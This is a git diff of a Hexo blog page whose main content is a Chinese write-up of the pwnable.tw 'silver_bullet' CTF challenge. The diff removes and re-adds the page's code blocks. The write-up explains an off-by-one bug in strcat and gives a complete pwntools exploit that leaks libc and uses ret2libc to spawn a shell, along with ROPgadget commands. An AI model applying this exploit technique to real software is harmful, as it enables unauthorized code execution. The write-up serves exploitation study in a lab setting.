@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="silver_bullet – 白板off-by-one漏洞利用​    这道题也是pwnable.tw上的一道200分的选单程序题，题目很有意思是一个打狼人的游戏，创造一把枪然后根据用户输入的长度给枪充能，然后去打死狼人。&#x2F;&#x2F;md语文水平太烂了，讲句话都讲不好。选单程序咩，先把逻辑分析清楚，看下各个函数。">
@@ -97,7 +97,7 @@
   </style>
 </noscript>
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -321,86 +321,13 @@
     <div class="post-body" itemprop="articleBody">
         <h1 id="silver-bullet-–-白板off-by-one漏洞利用"><a href="#silver-bullet-–-白板off-by-one漏洞利用" class="headerlink" title="silver_bullet – 白板off-by-one漏洞利用"></a>silver_bullet – 白板off-by-one漏洞利用</h1><p>​    这道题也是pwnable.tw上的一道200分的选单程序题，题目很有意思是一个打狼人的游戏，创造一把枪然后根据用户输入的长度给枪充能，然后去打死狼人。//md语文水平太烂了，讲句话都讲不好。<br>选单程序咩，先把逻辑分析清楚，看下各个函数。</p>
 <a id="more"></a>
-<pre><code>int menu()
-{
-  puts(&quot;+++++++++++++++++++++++++++&quot;);
-  puts(&quot;       Silver Bullet       &quot;);
-  puts(&quot;+++++++++++++++++++++++++++&quot;);
-  puts(&quot; 1. Create a Silver Bullet &quot;);
-  puts(&quot; 2. Power up Silver Bullet &quot;);
-  puts(&quot; 3. Beat the Werewolf      &quot;);
-  puts(&quot; 4. Return                 &quot;);
-  puts(&quot;+++++++++++++++++++++++++++&quot;);
-  return printf(&quot;Your choice :&quot;);
-}</code></pre><p>​    首先是菜单，显示给用户选项。<br>​    然后是creatbullet函数，初始化银枪并充能。<br>​    之后是powerup函数，主要功能是通过将新输入的字符串与初始化时的字符串<code>strcat</code>连接起来，并计算新的字符串的长度判断是否超过48，如果超过，就输出无法充能,之后更新银枪能量。<br>最后是beat函数，用银枪去打狼人，如果狼人hp为0就退出main函数。  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"+++++++++++++++++++++++++++"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       Silver Bullet       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"+++++++++++++++++++++++++++"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 1. Create a Silver Bullet "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 2. Power up Silver Bullet "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 3. Beat the Werewolf      "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 4. Return                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"+++++++++++++++++++++++++++"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Your choice :"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​    首先是菜单，显示给用户选项。<br>​    然后是creatbullet函数，初始化银枪并充能。<br>​    之后是powerup函数，主要功能是通过将新输入的字符串与初始化时的字符串<code>strcat</code>连接起来，并计算新的字符串的长度判断是否超过48，如果超过，就输出无法充能,之后更新银枪能量。<br>最后是beat函数，用银枪去打狼人，如果狼人hp为0就退出main函数。  </p>
 <p>利用思路：<br>    createbullet先输入47个字符进缓冲区,之后进行一次powerup，只输入1个字节，因为输入的是字符串，而且使用的是<code>&#39;strcat&#39;</code>函数,所以输入刚好凑齐48字节，最后的<code>&#39;\0&#39;</code>会将缓冲区的下一个字节覆盖，通过gdb调试可以发现缓冲区的下面一个字节存放的是字符串长度,<code>\0</code>刚好可以将len覆盖，这样我们就能通过powerup函数扩充栈然后构造输入溢出(第二次的powerup能输入47个字节，足够将将ebp后四位覆盖了)并将main函数返回地址覆盖,<img src="./return.png" alt="return">)由于这里没有像hacknote那样的任意命令执行，考虑ret2libc，通过覆盖返回地址构造rop链最后执行<code>system(&#39;/bin/sh&#39;)</code>来getshell，<img src="./shell.png" alt="/bin/sh">程序中有printf的plt地址，第一次可以将返回地址构造成printf函数调用的地址，由于这里无法使用栈存放参数，所以利用<code>pop ebx</code>指令将参数放进ebx供printf调用，<img src="./param.png" alt="param">然后将返回地址设置为main函数起始地址，之后就是再来一次上面的操作，ret2libc执行system调用getshell。<br>    嗯呐就是这样啦，网上看了下教程好像说大多数的off-by-one都是用来扩充栈容量然后给攻击者溢出的，反正这次mark啦。还有就是找rop链，有个工具叫ropgadget，还是很好用的(<code>ROPgadget --binary ./silver_bullet --only &#39;pop|ret&#39;</code>用来找pop ebx，ret;<code>ROPgadget --binary ./libc_32.so.6  --string &#39;/bin/sh&#39;</code>用来找<code>/bin/sh</code>字符串)。<br>    嗯呐大体就是这样子的。这算是个白板off-by-one了吧。</p>
 <p>exp如下:</p>
-<pre><code>#coding=utf8
-from pwn import *
-context.log_level = &#39;debug&#39;
-context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]
-local = 1
-if local:
-    #exe = &#39;./silver_bullet&#39;
-    #cn = gdb.debug(exe,&#39;&#39;&#39;
-    #    b *0x08048984
-    #    continue
-    #    &#39;&#39;&#39;)
-    cn = process(&#39;./silver_bullet&#39;)
-    bin = ELF(&#39;./silver_bullet&#39;)
-    libc = ELF(&#39;./libc_32.so.6&#39;)
-else:
-    cn = remote(&#39;chall.pwnable.tw&#39;, 10103)
-    bin = ELF(&#39;./silver_bullet&#39;)
-    libc = ELF(&#39;./libc_32.so.6&#39;)
-def z(a=&#39;&#39;):
-    gdb.attach(cn,a)
-    if a == &#39;&#39;:
-        raw_input()
-def create(con):
-    cn.sendline(&#39;1&#39;)
-    cn.recvuntil(&#39;of bullet :&#39;)
-    cn.send(con)
-def powerup(con):
-    cn.sendline(&#39;2&#39;)
-    cn.recvuntil(&#39;of bullet :&#39;)
-    cn.send(con)
-def beat():
-    cn.sendline(&#39;3&#39;)
-p1ret=0x08048475
-create(&#39;a&#39;*(0x30-1))
-powerup(&#39;b&#39;)#power 1
-#z(&#39;b*0x080488FB\nc&#39;)
-pay = &#39;\xff&#39;*3 + &#39;bbbb&#39;
-pay+=p32(bin.plt[&#39;puts&#39;])+p32(p1ret)+p32(bin.got[&#39;read&#39;])
-pay+=p32(bin.sym[&#39;main&#39;])
-#print pay
-powerup(pay)
-beat()
-cn.recvuntil(&#39;win !!\n&#39;)
-leak=u32(cn.recv(4))
-print hex(leak)
-libc.address = leak-libc.sym[&#39;read&#39;]         #image  base address
-success(&#39;libc_base: &#39;+hex(libc.address))
-system = libc.sym[&#39;system&#39;]
-binsh = libc.search(&#39;/bin/sh\x00&#39;).next()
-#print &#39;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#39;
-#print  hex(binsh)
-#print hex(libc2.search(&#39;/bin/sh&#39;).next()+libc.address)
-#print hex(libc2.search(&#39;/bin/sh&#39;).next())
-#print hex(libc.address+int(0x1794d1))
-#print &#39;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#39;
-#============one more time
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">local = 1</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	#exe = <span class="string">'./silver_bullet'</span></span><br><span class="line">	#cn = gdb.<span class="builtin-name">debug</span>(exe,<span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">	#	b *0x08048984</span></span><br><span class="line"><span class="string">	#	continue</span></span><br><span class="line"><span class="string">	#	'</span><span class="string">''</span>)</span><br><span class="line">	cn = process(<span class="string">'./silver_bullet'</span>)</span><br><span class="line">	bin = ELF(<span class="string">'./silver_bullet'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">'chall.pwnable.tw'</span>, 10103)</span><br><span class="line">	bin = ELF(<span class="string">'./silver_bullet'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">def z(<span class="attribute">a</span>=<span class="string">''</span>):</span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line">def create(con):</span><br><span class="line">	cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'of bullet :'</span>)</span><br><span class="line">	cn.send(con)</span><br><span class="line">def powerup(con):</span><br><span class="line">	cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'of bullet :'</span>)</span><br><span class="line">	cn.send(con)</span><br><span class="line">def beat():</span><br><span class="line">	cn.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="attribute">p1ret</span>=0x08048475</span><br><span class="line">create(<span class="string">'a'</span>*(0x30-1))</span><br><span class="line">powerup(<span class="string">'b'</span>)#power 1</span><br><span class="line"><span class="comment">#z('b*0x080488FB\nc')</span></span><br><span class="line">pay = <span class="string">'\xff'</span><span class="number">*3</span> + <span class="string">'bbbb'</span></span><br><span class="line">pay+=p32(bin.plt[<span class="string">'puts'</span>])+p32(p1ret)+p32(bin.got[<span class="string">'read'</span>])</span><br><span class="line">pay+=p32(bin.sym[<span class="string">'main'</span>])</span><br><span class="line"><span class="comment">#print pay</span></span><br><span class="line">powerup(pay)</span><br><span class="line">beat()</span><br><span class="line">cn.recvuntil(<span class="string">'win !!\n'</span>)</span><br><span class="line"><span class="attribute">leak</span>=u32(cn.recv(4))</span><br><span class="line"><span class="builtin-name">print</span> hex(leak)</span><br><span class="line">libc.address = leak-libc.sym[<span class="string">'read'</span>]         #image  base address</span><br><span class="line">success(<span class="string">'libc_base: '</span>+hex(libc.address))</span><br><span class="line">system = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"><span class="comment">#print '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'</span></span><br><span class="line"><span class="comment">#print  hex(binsh)</span></span><br><span class="line"><span class="comment">#print hex(libc2.search('/bin/sh').next()+libc.address)</span></span><br><span class="line"><span class="comment">#print hex(libc2.search('/bin/sh').next())</span></span><br><span class="line"><span class="comment">#print hex(libc.address+int(0x1794d1))</span></span><br><span class="line"><span class="comment">#print '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'</span></span><br><span class="line"><span class="comment">#============one more time</span></span><br><span class="line"></span><br><span class="line">create(<span class="string">'a'</span>*(0x30-1))</span><br><span class="line">powerup(<span class="string">'b'</span>)</span><br><span class="line">pay = <span class="string">'\xff'</span><span class="number">*3</span> + <span class="string">'bbbb'</span></span><br><span class="line"></span><br><span class="line">pay+=p32(system)+p32(p1ret)+p32(binsh)</span><br><span class="line">powerup(pay)</span><br><span class="line">beat()</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
 
-create(&#39;a&#39;*(0x30-1))
-powerup(&#39;b&#39;)
-pay = &#39;\xff&#39;*3 + &#39;bbbb&#39;
 
-pay+=p32(system)+p32(p1ret)+p32(binsh)
-powerup(pay)
-beat()
-cn.interactive()
-</code></pre>
     </div>
 
     
@@ -505,8 +432,6 @@ cn.interactive()
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
